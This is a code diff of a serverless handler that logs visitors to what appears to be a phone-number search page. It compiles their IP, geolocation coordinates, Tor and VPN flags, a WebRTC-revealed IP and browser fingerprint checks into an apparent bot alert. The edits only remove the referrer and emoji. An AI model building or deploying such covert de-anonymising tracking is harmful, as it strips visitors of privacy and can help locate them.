@@ -25,7 +25,6 @@ export default async function handler(request) {
             || 'Unknown';
 
     const userAgent = request.headers.get('user-agent') || 'Unknown';
-    const referer = request.headers.get('referer') || 'Direct';
     const acceptLang = request.headers.get('accept-language') || 'Unknown';
 
     // ===== IP LOOKUP =====
@@ -66,18 +65,18 @@ export default async function handler(request) {
       console.error('IP lookup failed:', e);
     }
 
-    // ===== TOR DETECTION (Server Side) =====
+    // ===== TOR DETECTION =====
     let torDetected = 'No';
     try {
       if (ipInfo.asname && ipInfo.asname.toLowerCase().includes('tor')) {
-        torDetected = 'Yes (ASN match)';
+        torDetected = 'Yes (ASN)';
       }
       if (ipInfo.isp && ipInfo.isp.toLowerCase().includes('tor')) {
-        torDetected = 'Yes (ISP match)';
+        torDetected = 'Yes (ISP)';
       }
     } catch {}
 
-    // ===== CLIENT-SIDE DATA =====
+    // ===== CLIENT DATA =====
     const body = await request.json().catch(() => ({}));
     const searchType = body.searchType || 'Unknown';
     const searchedNumber = body.searchedNumber || 'Not provided';
@@ -104,7 +103,6 @@ export default async function handler(request) {
     const pageLoadTime = body.pageLoadTime || 'Unknown';
     const vendor = body.vendor || 'Unknown';
 
-    // Detections
     const incognito = body.incognito || 'Unknown';
     const adBlocker = body.adBlocker || 'Unknown';
     const vpnWebrtc = body.vpnWebrtc || 'Unknown';
@@ -115,12 +113,10 @@ export default async function handler(request) {
     const automation = body.automation || 'Unknown';
     const devtools = body.devtools || 'Unknown';
 
-    // ===== DEVICE DETECT =====
     const device = detectDevice(userAgent);
     const browser = detectBrowser(userAgent);
     const os = detectOS(userAgent);
 
-    // ===== TIMESTAMP =====
     const timestamp = new Date().toLocaleString('en-IN', {
       timeZone: 'Asia/Kolkata',
     });
@@ -138,41 +134,41 @@ export default async function handler(request) {
     if (ipInfo.proxy) { suspicion += 30; suspicionFlags.push('Proxy'); }
     if (ipInfo.hosting) { suspicion += 20; suspicionFlags.push('Hosting'); }
 
-    let suspicionLevel = 'LOW ✅';
-    if (suspicion >= 70) suspicionLevel = 'CRITICAL 🚨';
-    else if (suspicion >= 40) suspicionLevel = 'HIGH ⚠️';
-    else if (suspicion >= 20) suspicionLevel = 'MEDIUM ⚡';
+    let suspicionLevel = 'LOW';
+    if (suspicion >= 70) suspicionLevel = 'CRITICAL';
+    else if (suspicion >= 40) suspicionLevel = 'HIGH';
+    else if (suspicion >= 20) suspicionLevel = 'MEDIUM';
 
-    // ===== MESSAGE =====
+    // ===== MESSAGE (CLEAN, NO EMOJI, NO REFERRER) =====
     const message = `
 <b>NEW SEARCH DETECTED</b>
-━━━━━━━━━━━━━━━━━━━━━
+─────────────────────
 
-<b>Search Query</b>
+<b>SEARCH QUERY</b>
 • Type: ${searchType}
 • Number: <code>${searchedNumber}</code>
 
-<b>Threat Assessment</b>
+<b>THREAT ASSESSMENT</b>
 • Level: ${suspicionLevel}
 • Score: ${suspicion}/100
 • Flags: ${suspicionFlags.length > 0 ? suspicionFlags.join(', ') : 'None'}
 
-━━━━━━━━━━━━━━━━━━━━━
+─────────────────────
 <b>SECURITY CHECKS</b>
-━━━━━━━━━━━━━━━━━━━━━
-• Incognito: ${incognito === 'Yes' ? '⚠️ YES' : '✅ No'}
-• Ad Blocker: ${adBlocker === 'Yes' ? '⚠️ YES' : '✅ No'}
-• Tor Network: ${torDetected === 'No' ? '✅ No' : '⚠️ ' + torDetected}
+─────────────────────
+• Incognito: ${incognito}
+• Ad Blocker: ${adBlocker}
+• Tor Network: ${torDetected}
 • Bot Detection: ${isBot}
 • Bot Score: ${botScore}/12
-• Headless: ${headless === 'No' ? '✅ No' : '⚠️ ' + headless}
-• Automation: ${automation === 'No' ? '✅ No' : '⚠️ ' + automation}
-• DevTools: ${devtools === 'No' ? '✅ No' : '⚠️ ' + devtools}
+• Headless: ${headless}
+• Automation: ${automation}
+• DevTools: ${devtools}
 • WebRTC IP: <code>${vpnWebrtc}</code>
 
-━━━━━━━━━━━━━━━━━━━━━
+─────────────────────
 <b>IP INFORMATION</b>
-━━━━━━━━━━━━━━━━━━━━━
+─────────────────────
 • IP: <code>${ip}</code>
 • ISP: ${ipInfo.isp}
 • ASN: ${ipInfo.as}
@@ -183,13 +179,13 @@ export default async function handler(request) {
 • Coordinates: ${ipInfo.lat || '?'}, ${ipInfo.lon || '?'}
 • Timezone: ${ipInfo.timezone}
 
-• Proxy/VPN: ${ipInfo.proxy ? '⚠️ YES' : '✅ No'}
-• Hosting: ${ipInfo.hosting ? '⚠️ YES' : '✅ No'}
+• Proxy/VPN: ${ipInfo.proxy ? 'Yes' : 'No'}
+• Hosting: ${ipInfo.hosting ? 'Yes' : 'No'}
 • Mobile Net: ${ipInfo.mobile ? 'Yes' : 'No'}
 
-━━━━━━━━━━━━━━━━━━━━━
+─────────────────────
 <b>DEVICE INFORMATION</b>
-━━━━━━━━━━━━━━━━━━━━━
+─────────────────────
 • Device: ${device}
 • OS: ${os}
 • Browser: ${browser}
@@ -212,10 +208,9 @@ export default async function handler(request) {
 • Connection: ${connection}
 • Page Load: ${pageLoadTime} ms
 
-━━━━━━━━━━━━━━━━━━━━━
+─────────────────────
 <b>REQUEST METADATA</b>
-━━━━━━━━━━━━━━━━━━━━━
-• Referrer: ${referer}
+─────────────────────
 • Accept-Lang: ${acceptLang}
 • Time: ${timestamp}
 • User Agent: <code>${userAgent}</code>
